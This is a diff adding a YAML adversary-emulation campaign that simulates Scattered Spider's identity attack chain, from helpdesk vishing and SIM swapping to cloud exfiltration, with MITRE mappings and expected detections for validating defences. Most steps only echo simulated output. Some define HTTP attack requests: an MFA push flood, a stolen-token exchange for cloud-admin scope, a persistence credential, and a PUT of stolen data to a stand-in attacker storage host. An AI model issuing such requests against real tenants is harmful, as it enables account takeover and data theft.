@@ -1,0 +1,241 @@
+api_version: v1
+kind: Campaign
+
+meta:
+  name: scattered-spider
+  adversary: Scattered-Spider
+  description: "Scattered Spider (UNC3944/Octo Tempest) identity-focused intrusion — social engineering, SIM-swapping, MFA fatigue, and cloud identity abuse targeting enterprise cloud environments. Operates primarily through identity provider compromise rather than traditional malware."
+  objective: "Simulate Scattered Spider's identity-centric kill chain to validate detection coverage across social engineering, MFA bypass, cloud account takeover, and cloud data exfiltration."
+  mitre_version: "15.1"
+  severity: critical
+  tags: [social-engineering, identity, cloud, sim-swap, mfa-bypass, scattered-spider]
+  authors: ["ThreatEcho"]
+  references:
+    - "https://attack.mitre.org/groups/G1015/"
+    - "https://www.microsoft.com/en-us/security/blog/2023/10/25/octo-tempest-crosses-boundaries-to-facilitate-extortion-encryption-and-destruction/"
+    - "https://www.mandiant.com/resources/blog/unc3944-sms-phishing-sim-swapping-ransomware"
+    - "https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-320a"
+  created: "2025-03-15"
+  modified: "2025-09-05"
+
+variables:
+  target_org: "corp.example.com"
+  idp_url: "https://identity.corp.example.com"
+  cloud_console: "https://console.cloud.example.com"
+  cloud_storage: "https://storage.cloud.example.com"
+  attacker_cloud: "https://attacker-storage.example.com/exfil"
+  helpdesk_number: "+1-555-0199"
+  target_user: "admin@corp.example.com"
+
+stages:
+  - id: vishing-helpdesk
+    name: Vishing IT Helpdesk for Credential Reset
+    description: "Social engineering call to the IT helpdesk impersonating a locked-out employee. The attacker uses publicly available employee information (LinkedIn, corporate directory) to pass identity verification and request a password reset for a privileged account."
+    technique: T1566.003
+    tactic: initial-access
+    execute:
+      type: shell
+      commands:
+        - 'echo "[SIM] Calling helpdesk at {{helpdesk_number}} as impersonated employee"'
+        - 'echo "[SIM] Passed identity verification using OSINT (employee ID, manager name, department)"'
+        - 'echo "[SIM] Helpdesk initiated password reset for {{target_user}}"'
+        - 'echo "[SIM] Temporary password received via attacker-controlled callback number"'
+    expect:
+      telemetry: [api_call, network_connection]
+      detections: [helpdesk_social_engineering, password_reset_for_privileged_account, unusual_password_reset_channel]
+    on_success: sim-swap-mfa-bypass
+    on_failure: abort
+    timeout: 120s
+
+  - id: sim-swap-mfa-bypass
+    name: SIM Swap for MFA Bypass
+    description: "Execute a SIM-swapping attack against the target user's mobile carrier to intercept SMS-based MFA codes. The attacker ports the victim's phone number to an attacker-controlled SIM, enabling interception of one-time passwords sent via SMS."
+    technique: T1078
+    tactic: initial-access
+    depends_on: [vishing-helpdesk]
+    execute:
+      type: shell
+      commands:
+        - 'echo "[SIM] Contacting mobile carrier to initiate number port for target user"'
+        - 'echo "[SIM] SIM swap successful — SMS messages now routed to attacker device"'
+        - 'echo "[SIM] Intercepted MFA code: 847293"'
+    expect:
+      telemetry: [network_connection, api_call]
+      detections: [sim_swap_indicator, mfa_from_new_device, phone_number_change_detected, unusual_mfa_source]
+    on_success: mfa-fatigue-push
+    on_failure: continue
+    timeout: 60s
+
+  - id: mfa-fatigue-push
+    name: MFA Fatigue Push Notification Attack
+    description: "Flood the target user's authenticator app with repeated MFA push notifications until the user approves one out of frustration or confusion. Scattered Spider commonly combines this with vishing — calling the target while sending pushes, claiming IT is testing the MFA system."
+    technique: T1621
+    tactic: credential-access
+    depends_on: [vishing-helpdesk]
+    execute:
+      type: http
+      target: "{{idp_url}}/api/v1/authn/factors/push"
+      args:
+        method: POST
+        content_type: "application/json"
+        payload: '{"username": "{{target_user}}", "factor": "push", "repeat": 50, "interval_seconds": 10}'
+    expect:
+      telemetry: [api_call, network_connection]
+      detections: [mfa_fatigue_detected, excessive_push_notifications, repeated_mfa_challenge, mfa_bombing_pattern]
+    on_success: steal-session-cookie
+    on_failure: continue
+    timeout: 300s
+
+  - id: steal-session-cookie
+    name: Steal Web Session Cookie
+    description: "After MFA approval or bypass, steal the authenticated web session cookie from the identity provider. The session token provides persistent access without requiring repeated MFA challenges."
+    technique: T1539
+    tactic: credential-access
+    depends_on: [mfa-fatigue-push]
+    execute:
+      type: shell
+      commands:
+        - 'echo "[SIM] Capturing session cookie from IdP authentication response"'
+        - 'echo "[SIM] Session token: eyJhbGciOiJSUzI1NiIs... (valid for 8 hours)"'
+        - 'echo "[SIM] Cookie replay test successful — authenticated as {{target_user}}"'
+    expect:
+      telemetry: [network_connection, api_call]
+      detections: [session_cookie_theft, session_replay_detected, cookie_used_from_new_ip, impossible_travel_alert]
+    on_success: steal-oauth-token
+    on_failure: continue
+
+  - id: steal-oauth-token
+    name: Steal OAuth Access Token
+    description: "Extract OAuth/SAML tokens from the compromised identity provider session. These tokens provide API-level access to cloud services (Azure, AWS, GCP) without going through the web console, enabling programmatic access to cloud resources."
+    technique: T1528
+    tactic: credential-access
+    depends_on: [steal-session-cookie]
+    execute:
+      type: http
+      target: "{{idp_url}}/oauth2/token"
+      args:
+        method: POST
+        content_type: "application/x-www-form-urlencoded"
+        payload: "grant_type=urn:ietf:params:oauth:grant-type:token-exchange&subject_token=<stolen_session_token>&scope=cloud-admin"
+    expect:
+      telemetry: [api_call, network_connection]
+      detections: [oauth_token_theft, suspicious_token_exchange, token_request_from_unusual_ip, high_privilege_token_minted]
+    on_success: cloud-account-login
+    on_failure: continue
+    timeout: 30s
+
+  - id: cloud-account-login
+    name: Cloud Account Access with Stolen Credentials
+    description: "Access the target's cloud environment using the stolen OAuth tokens and session credentials. Scattered Spider targets Azure AD, AWS IAM, and Okta to gain broad access to cloud infrastructure and SaaS applications."
+    technique: T1078.004
+    tactic: initial-access
+    depends_on: [steal-oauth-token, sim-swap-mfa-bypass]
+    execute:
+      type: http
+      target: "{{cloud_console}}/api/v1/session"
+      args:
+        method: POST
+        content_type: "application/json"
+        payload: '{"access_token": "<stolen_oauth_token>", "provider": "azure-ad"}'
+    expect:
+      telemetry: [api_call, network_connection]
+      detections: [cloud_login_from_unusual_location, stolen_credential_usage, cloud_account_compromise, first_time_cloud_access_from_ip]
+    on_success: cloud-dashboard-recon
+    on_failure: abort
+    timeout: 30s
+
+  - id: cloud-dashboard-recon
+    name: Cloud Service Dashboard Reconnaissance
+    description: "Enumerate cloud resources, services, and configurations through the cloud management console. Scattered Spider maps out the target's cloud footprint — storage buckets, compute instances, databases, and IAM configurations — to identify high-value data targets."
+    technique: T1538
+    tactic: discovery
+    depends_on: [cloud-account-login]
+    execute:
+      type: http
+      target: "{{cloud_console}}/api/v1/resources"
+      args:
+        method: GET
+    expect:
+      telemetry: [api_call, network_connection]
+      detections: [cloud_resource_enumeration, excessive_api_calls, cloud_dashboard_reconnaissance, unusual_resource_listing_volume]
+    on_success: cloud-account-enum
+    on_failure: continue
+    timeout: 60s
+
+  - id: cloud-account-enum
+    name: Cloud Account and Role Discovery
+    description: "Enumerate all cloud accounts, IAM roles, service principals, and permission boundaries. Identify over-privileged accounts and roles that can be escalated or abused for broader access to sensitive resources."
+    technique: T1087.004
+    tactic: discovery
+    depends_on: [cloud-dashboard-recon]
+    execute:
+      type: shell
+      commands:
+        - 'echo "[SIM] Listing all IAM users and roles in cloud tenant"'
+        - 'echo "[SIM] Found 23 users, 8 service principals, 4 with GlobalAdmin role"'
+        - 'echo "[SIM] Identified 3 over-privileged service accounts with storage access"'
+        - 'echo "[SIM] Mapping cross-account trust relationships"'
+    expect:
+      telemetry: [api_call, network_connection]
+      detections: [cloud_account_enumeration, iam_role_discovery, suspicious_iam_listing, privilege_mapping_detected]
+    on_success: add-cloud-credentials
+    on_failure: continue
+
+  - id: add-cloud-credentials
+    name: Add Attacker-Controlled Cloud Credentials
+    description: "Create additional cloud credentials (API keys, service principal secrets, federated identity credentials) on compromised accounts for persistent access. Scattered Spider adds backup authentication methods that survive password resets and MFA re-enrollment."
+    technique: T1098.001
+    tactic: persistence
+    depends_on: [cloud-account-enum]
+    execute:
+      type: http
+      target: "{{cloud_console}}/api/v1/credentials"
+      args:
+        method: POST
+        content_type: "application/json"
+        payload: '{"type": "service_principal_secret", "target_account": "svc-backup@{{target_org}}", "description": "Automated backup credential"}'
+    expect:
+      telemetry: [api_call, network_connection]
+      detections: [credential_added_to_service_principal, new_api_key_created, persistence_via_cloud_credentials, unauthorized_credential_creation]
+    on_success: collect-cloud-data
+    on_failure: continue
+    timeout: 30s
+
+  - id: collect-cloud-data
+    name: Collect Sensitive Data from Cloud Storage
+    description: "Access and collect sensitive data from cloud storage services — S3 buckets, Azure Blob Storage, Google Cloud Storage. Scattered Spider targets customer databases, source code repositories, internal documentation, and financial records."
+    technique: T1005
+    tactic: collection
+    depends_on: [cloud-dashboard-recon, add-cloud-credentials]
+    execute:
+      type: http
+      target: "{{cloud_storage}}/api/v1/objects"
+      args:
+        method: GET
+        payload: '{"bucket": "corp-sensitive-data", "prefix": "finance/", "recursive": true}'
+    expect:
+      telemetry: [api_call, file_read, network_connection]
+      detections: [mass_cloud_storage_access, sensitive_bucket_enumeration, bulk_object_download, unusual_data_access_pattern]
+    on_success: exfil-to-cloud-storage
+    on_failure: continue
+    timeout: 120s
+
+  - id: exfil-to-cloud-storage
+    name: Exfiltration to Attacker-Controlled Cloud Storage
+    description: "Exfiltrate collected data to attacker-controlled cloud storage accounts. Scattered Spider uses legitimate cloud-to-cloud transfer mechanisms to blend exfiltration with normal cloud operations, making detection through network monitoring alone insufficient."
+    technique: T1567.002
+    tactic: exfiltration
+    depends_on: [collect-cloud-data]
+    execute:
+      type: http
+      target: "{{attacker_cloud}}"
+      args:
+        method: PUT
+        content_type: "application/octet-stream"
+        payload: "encrypted_archive.tar.gz.enc (AES-256 encrypted collection of finance/, hr/, and engineering/ data)"
+    expect:
+      telemetry: [api_call, network_connection, file_read]
+      detections: [cloud_to_cloud_exfiltration, data_transfer_to_external_tenant, unusual_outbound_cloud_transfer, large_upload_to_unknown_storage, exfiltration_via_cloud_service]
+      iocs: ["{{attacker_cloud}}"]
+    on_failure: abort
+    timeout: 300s
